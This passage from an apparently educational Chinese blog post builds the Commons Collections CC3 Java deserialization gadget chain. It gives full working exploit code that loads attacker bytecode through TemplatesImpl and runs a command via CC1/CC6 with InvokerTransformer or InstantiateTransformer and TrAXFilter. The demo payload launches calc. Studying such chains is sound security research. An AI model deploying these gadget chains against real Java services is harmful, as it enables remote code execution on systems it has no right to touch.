class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br></code></pre></td></tr></table></figure></li></ul><p>2 .<strong>_bytecodes:</strong></p><p>跟进到TemplatesImpl.getTransletInstance调的defineTransletClasses</p><ul><li><img src="/2025/04/23/CC3/image-20250421093212273-17454122869998.png" alt="image-20250421093212273"></li></ul><p>  _bytecodes是二维数组</p><p>  <img src="/2025/04/23/CC3/image-20250421093610675-17454122886369.png" alt="image-20250421093610675"></p><p>  但是最后defineClass加载类时调的参数_bytecodes,是一维数组的形式，</p><p>  所以把想执行的代码放到一维数组中，套在二维数组中</p><p>  <img src="/2025/04/23/CC3/image-20250421093953596-174541229199510.png" alt="image-20250421093953596"></p><p>  <img src="/2025/04/23/CC3/image-20250421094018451-174541229370111.png" alt="image-20250421094018451"></p><p>  写一个要加载的类：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>  赋值_bytecodes：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://tmp/classes/Test_.class&quot;</span>));<br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br></code></pre></td></tr></table></figure><p>3 .<strong>_tfactory</strong> </p><p>defineTransletClasses还有一个参数_tfactory,</p><p><img src="/2025/04/23/CC3/image-20250423210821831-174541386371430.png" alt="image-20250423210821831"></p><p>定义时为空  transient 限制了_tfactory不能被序列化</p><blockquote><p>被标记为transient的属性在对象被序列化的时候不会被保存</p></blockquote><p><img src="/2025/04/23/CC3/image-20250421174933771-174541229574012.png" alt="image-20250421174933771"></p><p>现在我们需要它不为空，但是现在赋值再反序列化，  _tfactory肯定是不会被序列化，赋值自然无效</p><p>发现在readObject中就给_tfactory赋了值，所以我们不用管它等之后反序列化的时候它就会被赋值</p><p><img src="/2025/04/23/CC3/image-20250421175335605-174541229724313.png" alt="image-20250421175335605"></p><p>但现在为了看构造是否成功就先反射赋值，调newTransformer看效果</p><p><img src="/2025/04/23/CC3/image-20250421190520423-174541229875214.png" alt="image-20250421190520423"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>  tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>  tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>  <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> templates.newTransformer();<br></code></pre></td></tr></table></figure><p>报错了：<br><img src="/2025/04/23/CC3/image-20250421200602172-174541230034915.png" alt="image-20250421200602172"></p><p>调试进defineTransletClasses找问题</p><p><img src="/2025/04/23/CC3/image-20250421215941833-174541230193316.png" alt="image-20250421215941833"></p><p>还有就是_transletIndex现在默认值是-1&lt;0,就算给  _auxClasses赋值，下面会抛出异常的</p><p>所以就让它满足if，给_transletIndex赋值</p><p><img src="/2025/04/23/CC3/image-20250421220240417-174541386856731.png" alt="image-20250421220240417"></p><p>由上面的for循环可知：superClass是加载的外部类的父类</p><p>所以就让写的这个要执行的类继承AbstractTranslet</p><p><img src="/2025/04/23/CC3/image-20250421221223972-174541230507818.png" alt="image-20250421221223972"></p><p><img src="/2025/04/23/CC3/image-20250422102516144-174541230710619.png" alt="image-20250422102516144"></p><p>但要注意AbstractTranslet是抽象类还实现了一个接口，写的这个类就要重写的抽象类所有抽象方法和抽象类没有实现接口的方法<img src="/2025/04/23/CC3/image-20250422102821774-174541230866920.png" alt="image-20250422102821774"></p><p>要执行的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test_</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">static</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>所以现在构造为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>上面这部分的构造就是构造的加载类执行代码，之后调用newTransformer与CC1或CC6一样</p><p>相当于把CC1的Runtime.getRuntime.exec(), <strong>rce 执行代码</strong>变成了CC3的<strong>加载类触发类初始化执行代码</strong></p><h4 id="完整EXP-（invokerTransformer）"><a href="#完整EXP-（invokerTransformer）" class="headerlink" title="完整EXP （invokerTransformer）"></a>完整EXP （invokerTransformer）</h4><p><strong>CC1+CC3(InvokerTransformer)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, InvocationTargetException, InstantiationException, NoSuchMethodException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>        nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>        bytecodes.set(templates,codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>       <span class="hljs-comment">// templates.newTransformer();</span><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>),<br><br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br>        Class&lt;?&gt; c = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor2 = c.getDeclaredConstructor(Class.class, Map.class);<br>        constructor2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler)constructor2.newInstance(Target.class, lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, h);<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor2.newInstance(Override.class, mapProxy);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span> <span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(o);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span> <span class="hljs-params">(String filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>CC6+CC3(InvokerTransformer)</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>            Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>            nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>            nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>            bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br>            <span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>            bytecodes.set(templates,codes);<br><br><span class="hljs-comment">//            Class&lt;TrAXFilter&gt; trAXFilterClass = TrAXFilter.class;</span><br><span class="hljs-comment">//            trAXFilterClass.getDeclaredConstructor(Templates.class).newInstance(templates);</span><br><span class="hljs-comment">//            templates.newTransformer();</span><br><br><br><br>            Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                   <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),<br>                    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>)<br><br>            &#125;;<br>            <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>            <span class="hljs-comment">//不用ChainedTransformer+ConstantTransforme组合还控制不了transform(xx)，xx 是在别的类中调transform是就赋好的</span><br><br>        <span class="hljs-comment">//  InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);</span><br><br><br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>           <br>            <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>( lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>            <span class="hljs-comment">//      tiedMapEntry.getValue();要调到getValue</span><br>            HashMap&lt;Object, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>            map2.put(tiedMapEntry, <span class="hljs-string">&quot;bbb&quot;</span>);<br>            lazyMap.remove(<span class="hljs-string">&quot;aaa&quot;</span>);<br><br>            Class&lt;LazyMap&gt; lazyMapClass = LazyMap.class;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">factoryFiled</span> <span class="hljs-operator">=</span> lazyMapClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>            factoryFiled.setAccessible(<span class="hljs-literal">true</span>);<br>            factoryFiled.set(lazyMap,chainedTransformer);<br><br>            serialize(map2);<br>            unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br><br></code></pre></td></tr></table></figure><h2 id="CC3-InstantiateTransformer"><a href="#CC3-InstantiateTransformer" class="headerlink" title="CC3_InstantiateTransformer"></a>CC3_InstantiateTransformer</h2><p><img src="/2025/04/23/CC3/image-20250428194352388-17458406540412.png" alt="image-20250428194352388"></p><h3 id="分析怎么调newTransformer"><a href="#分析怎么调newTransformer" class="headerlink" title="分析怎么调newTransformer"></a>分析怎么调newTransformer</h3><p><strong>禁用InvokerTransformer</strong></p><p>官方CC3中用了InstantiateTransformer</p><p>如果黑名单禁用Runtime，InvokerTransformer</p><p>尾部加载类执行任意代码还是一样的，但就不能用InvokerTransformer调任意方法，就不能调上面那条链中TemplatesImpl.newTransformer</p><p>那就找谁调用了newTransformer（不同类的同名函数）</p><p>找到TrAXFilter的有参构造函数中调用了templates.newTransformer,并且恰好templates是Templates类，要利用的是TemplatesImpl ，（相同类型）可以传参，但它没有继承Serializable，不能序列化，所以要执行构造器里面的话，直接new实例化肯定不行</p><p><img src="/2025/04/23/CC3/image-20250422162017718-174541231217321.png" alt="image-20250422162017718"></p><p>这时候就想它和Runtime一样，需要借助Class类反射传参</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>Class&lt;TrAXFilter&gt; trAXFilterClass = TrAXFilter.class;<br>trAXFilterClass.getDeclaredConstructor(Templates.class).newInstance(templates);<br></code></pre></td></tr></table></figure><p>成功弹出，可以利用</p><p>CC3的作者找到一个新的InstantiateTransformer.transform它就有点像InvokerTransformer.transform的平替，实现任意类反射实例化（调任意class的构造器）</p><ul><li>InvokerTransformer.transform调任意方法<ul><li>调执行代码的就是RCE</li><li>调TemplatesImpl.newTransformer从而执行类初始化  就是执行任意代码</li></ul></li><li>InstantiateTransformer.transform反射调任意类的构造器实例化对象</li></ul><p><img src="/2025/04/23/CC3/image-20250422192152536-174541231443822.png" alt="image-20250422192152536"></p><p>就可以换成InstantiateTransformer.transform的写法 方便与CC1或CC6前半部分相连</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>Class&lt;TemplatesImpl&gt; c1 = TemplatesImpl.class;<br><span class="hljs-type">Field</span> <span class="hljs-variable">nameFiled</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>nameFiled.setAccessible(<span class="hljs-literal">true</span>);<br>nameFiled.set(templates,<span class="hljs-string">&quot;aaa&quot;</span>);<br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Security/java/tmp/classes/Test_.class&quot;</span>));<br><span class="hljs-type">byte</span>[][]codes=&#123;code&#125;;<br>bytecodes.set(templates,codes);<br><span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> c1.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br><br><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<span class="hljs-comment">//构造器的参数类型，构造器的参数</span><br>instantiateTransformer.transform(TrAXFilter.class);<br></code></pre></td></tr></table></figure><p>成功弹出，后面接上CC1或CC6来调transform</p><p>CC1:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<span class="hljs-comment">//构造器的参数类型，构造器的参数</span><br><span 